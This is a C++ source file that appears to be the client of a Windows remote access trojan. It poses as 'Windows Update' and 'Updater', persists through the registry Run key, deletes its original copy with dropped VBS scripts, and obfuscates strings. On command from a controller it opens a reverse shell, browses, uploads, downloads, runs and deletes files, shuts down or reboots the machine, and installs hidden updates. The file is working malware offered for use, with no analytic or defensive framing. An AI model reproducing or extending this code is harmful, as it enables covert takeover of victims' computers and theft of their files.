#pragma once

bool IsInstalled()
{
	RegUtils ru;

	return (ru.RegRead("SOFTWARE\\Windows Update", "Install State", REG_SZ) == "true");	
}

short InstallClient()
{
	Settaggi sett;
	RegUtils ru;
	SystemUtils su;
	DirUtils du;

	string RemVBS = "";

	sett.InstallSettings();

	string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;

	if (PathToCopy.find("<User>") != string::npos)
		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());

	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");

	if (sett.RegStartup)
		if (!ru.RegWrite(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater", REG_SZ, ("\"" + PathToCopy + "\"").c_str()))
			return 2;

	if (du.GetFullModuleFilePath() != PathToCopy)
	{
		if (DEBUG)
			cout << PathToCopy << " <- " << du.GetFullModuleFilePath() << endl;

		du.DelFile(PathToCopy);
		if (!du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy))
			return 3;

		RemVBS += "WScript.Sleep 1000\n";
		RemVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
		RemVBS += "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
		RemVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"";

		du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", RemVBS);

		if(!DEBUG)
			su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
	}

	if (!ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true"))
		return 4;

	su.RunExe(PathToCopy);

	return 0;
}

json DirFileTOjson(VectDirFile DirFiles)
{
	DirUtils du;
	json j;

	for (int i = 0; i < DirFiles.size(); i++)
	{
		if (DirFiles[i].Name == ".")
			DirFiles.erase(DirFiles.begin() + i);

		j["Files"][i]["Type"] = (DirFiles[i].Type == 1);
		j["Files"][i]["Name"] = (j["Files"][i]["Type"]) ? DirFiles[i].Name : DirFiles[i].Name + "\\";
		j["Files"][i]["Path"] = (du.GetCurrDir().size() == 3) ? du.GetCurrDir() : du.GetCurrDir() + "\\";
		j["Files"][i]["FullPath"] = (du.GetCurrDir().size() == 3) ? du.GetCurrDir() + DirFiles[i].Name : du.GetCurrDir() + "\\" + DirFiles[i].Name;
		j["Files"][i]["Size"] = (j["Files"][i]["Type"]) ? du.GetSizeOfFile(j["Files"][i]["FullPath"]) : 0;
		j["Files"][i]["LastEdit"] = du.GetTimeOfFile(j["Files"][i]["FullPath"]).LastWriteTime;
	}

	return j;
}

// COMANDI

bool GetInfo(SOCKET Sock)
{
    SystemUtils su;
    DirUtils du;
	WindowUtils wu;
	Settaggi sett;

	sett.GetSettingsFromReg();

	json j;

    j["IPL"] = TcpIP::GetLocalIP(Sock);
    j["CPU"] = to_string((int)su.GetCPUload()) + "%";
    j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
	j["ACTWIN"] = wu.GetWindowTitle();
	j["INSTDATE"] = sett.InstallDate;

	return COMUNICAZIONI::GetInfo(Sock, j.dump());
}

bool InvertMouse(SOCKET Sock)
{
	MouseUtils mu;

	return COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
}

bool UpdateClient(SOCKET Sock)
{
	DirUtils du;
	SystemUtils su;
	RegUtils ru;
	COMUNICAZIONI::NewClient NewClient;

	string FMFP = du.GetFullModuleFilePath();
	string MFP = du.GetModuleFilePath();
	string MF = du.GetModuleFile();
	string UpdateVBS = "";

	NewClient = COMUNICAZIONI::UpdateClient(Sock);

	if (NewClient.j.dump() == "null")
		return false;

	if (!du.CheckDir(MFP + "VXBkYXRl"))
		du.MakeDir(MFP + "VXBkYXRl");

	if (!du.WriteBinaryFile(MFP + "VXBkYXRl\\" + MF, NewClient.Str))
		return false;

	if (NewClient.j["Hidden"])
		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + MFP + "VXBkYXRl\\" + MF + "\"");
	if (NewClient.j["System"])
		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + MFP + "VXBkYXRl\\" + MF + "\"");

	UpdateVBS += "WScript.Sleep 2500\n";
	UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
	UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
	UpdateVBS += "filesys.DeleteFile \"" + FMFP + "\"\n";
	UpdateVBS += "filesys.MoveFile \"" + MFP + "VXBkYXRl\\" + MF + "\", \"" + FMFP + "\"\n";
	UpdateVBS += "WScript.Sleep 1000\n";
	UpdateVBS += "WshShell.Run \"\"\"" + FMFP + "\"\"\", 1, false\n";
	UpdateVBS += "filesys.DeleteFolder \"" + MFP + "VXBkYXRl\"\n";
	UpdateVBS += "filesys.DeleteFile \"" + MFP + "Update.vbs\"";

	if (!du.WriteFile(MFP + "Update.vbs", UpdateVBS))
		return false;

	ru.RegDelKey("SOFTWARE\\Windows Update");

	su.NoOutputCMD("start \"\" \"" + MFP + "Update.vbs\"");

	return true;
}

void Uninstall()
{
	RegUtils ru;
	DirUtils du;
	SystemUtils su;

	string RemoveVBS = "";

	ru.RegDelKey("SOFTWARE\\Windows Update");
	ru.RegDelValue(AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");

	RemoveVBS = "WScript.Sleep 5000\n";
	RemoveVBS = "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
	RemoveVBS = "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
	RemoveVBS = "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"";

	du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", RemoveVBS);
	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Remove.vbs\"");
}

void RestartClient()
{
	DirUtils du;
	SystemUtils su;

	su.RunExe(du.GetFullModuleFilePath());
}

void ReverseShell(SOCKET Sock)
{
	DirUtils du;
	SystemUtils su;
	
	string Cmd;
	string Res = "OK";
	string Path = du.GetModuleFilePath(false);
	
	du.SetCurrDir(Path);
	
	while (true)
	{
		Cmd = COMUNICAZIONI::PingPong(Sock, Res);
		
		if (Cmd == "")
			return;
		else if (Cmd == "Get cd")
			Res = Path;
		else if (ToLowerCase(Cmd).find("chdir") != string::npos)
		{
			if (ToLowerCase(Cmd) == "chdir .." || ToLowerCase(Cmd) == "chdir..")
			{
				if (Path.size() > 3)
					Path = Path.substr(0, Path.find_last_of("\\"));
				if (Path.size() == 2)
					Path += "\\";

				du.SetCurrDir(Path);
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 9)) == "chdir /d ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(10, Cmd.find_last_of("\"") - 10)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(9)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd.substr(0, 6)) == "chdir ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(6)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else
				Res = su.GetCMDOutput(Cmd);
		}
		else if (ToLowerCase(Cmd).find("cd") != string::npos)
		{
			if (ToLowerCase(Cmd) == "cd .." || ToLowerCase(Cmd) == "cd..")
			{
				if (Path.size() > 3)
					Path = Path.substr(0, Path.find_last_of("\\"));
				if (Path.size() == 2)
					Path += "\\";

				du.SetCurrDir(Path);
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd).find("/d") != string::npos && ToLowerCase(Cmd.substr(0, 6)) == "cd /d ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(6)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else if (ToLowerCase(Cmd.substr(0, 3)) == "cd ")
			{
				if (Cmd.find("\"") != string::npos)
				{
					if (du.SetCurrDir(Cmd.substr(4, Cmd.find_last_of("\"") - 4)))
						Path = du.GetCurrDir();
				}
				else
					if (du.SetCurrDir(Cmd.substr(3)))
						Path = du.GetCurrDir();
				
				Res = "\n";
			}
			else
				Res = su.GetCMDOutput(Cmd);
		}
		else if (ToLowerCase(Cmd) == "exit")
		{
			TcpIP::SendString(Sock, (string)AY_OBFUSCATE("Reverse shell closed"));
			return;
		}
		else if (ToLowerCase(Cmd).substr(0, 7) == "notepad")
		{
			su.AsyncCMD(Cmd);
			Res = "\n";
		}
		else
			Res = su.GetCMDOutput(Cmd) + "\n";
	}
}

void FileExplorer(SOCKET Sock)
{
	SystemUtils su;
	DirUtils du;
	string Buff = "";
	string Res = "";
	json j;

	VectDirFile DirFiles;

	du.SetCurrDir(du.GetModuleFilePath());
	du.GetDir(du.GetCurrDir(), DirFiles);

	j = DirFileTOjson(DirFiles);

	if (DEBUG)
		cout << j.dump() << endl;

	Buff = COMUNICAZIONI::PingPong(Sock, j.dump());

	for (bool b = true; b;)
	{
		if (Buff == "")
			break;

		j.clear();
		j = json::parse(Buff);

		if (j["Action"] == "Exit")
			break;
		else if (j["Action"] == "OpenDir")
		{
			DirFiles.clear();

			if (du.SetCurrDir(j["Path"]))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
		}
		else if (j["Action"] == "RunFile")
		{
			DirFiles.clear();

			du.RunFile(j["Path"]);
			du.GetDir(du.GetCurrDir(), DirFiles);

			j.clear();
			j = DirFileTOjson(DirFiles);

			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
		}
		else if (j["Action"] == "GoUp")
		{
			DirFiles.clear();

			if (du.SetCurrDir(du.GetCurrDir() + "\\.."))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
		}
		else if (j["Action"] == "Delete")
		{
			bool Success = false;

			DirFiles.clear();

			if (j["Type"])
				Success = du.DelFile(j["Path"]);
			else
				Success = du.DelDir(j["Path"]);

			if (Success)
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Refresh")
		{
			DirFiles.clear();
			du.GetDir(du.GetCurrDir(), DirFiles);

			j.clear();
			j = DirFileTOjson(DirFiles);

			Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
		}
		else if (j["Action"] == "Rename")
		{
			DirFiles.clear();

			if (du.RenameFileOrDir(j["OldName"], j["NewName"]))
			{
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileTOjson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Upload")
		{
			string FileName;
			string FileContent;

			DirFiles.clear();

			if (!COMUNICAZIONI::DownloadFileWithLoading(Sock, FileName, FileContent))
				break;

			if (du.WriteBinaryFile(FileName, FileContent))
			{
				Buff = COMUNICAZIONI::PingPong(Sock, "OK");
			}
			else
			{
				if (DEBUG)
				{
					char errmsg[256];
					strerror_s(errmsg, 256, errno);
					cout << errmsg << endl;
				}
				Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
		}
		else if (j["Action"] == "Download")
		{
			string FilePath = j["Path"];
			string FileName = FilePath.substr(FilePath.find_last_of("\\") + 1);

			if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(FilePath)))
				break;

			if (!TcpIP::RecvString(Sock, Buff))
				break;
		}
		else
			break;
	}
}

short Sessione(TcpIP Client)
{
	SystemUtils su;
	string cmd = "";

	for (bool i = true; i;)
	{
		cmd = Client.RecvString();

		if (cmd == "")
			i = false;
		else if (cmd == "getinfo")
		{
			i = GetInfo(Client.Sock);
		}
		else if (cmd == "invertmouse")
		{
			i = InvertMouse(Client.Sock);
		}
		else if (cmd == "reconnect")
		{
			i = false;
		}
		else if (cmd == "kill")
		{
			return 1;
		}
		else if (cmd == "shutdown")
		{
			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -s -t 0"));
			return 1;
		}
		else if (cmd == "reboot")
		{
			su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -r -t 0"));
			return 1;
		}
		else if (cmd == "updateclient")
		{
			if (UpdateClient(Client.Sock))
				return 1;
		}
		else if (cmd == "uninstall")
		{
			Uninstall();
			return 1;
		}
		else if (cmd == "restart")
		{
			RestartClient();
			return 1;
		}
		else if (cmd == (string)AY_OBFUSCATE("reverseshell"))
		{
			ReverseShell(Client.Sock);
		}
		else if (cmd == "fileexplorer")
		{
			FileExplorer(Client.Sock);
		}
	}

	return 0;
}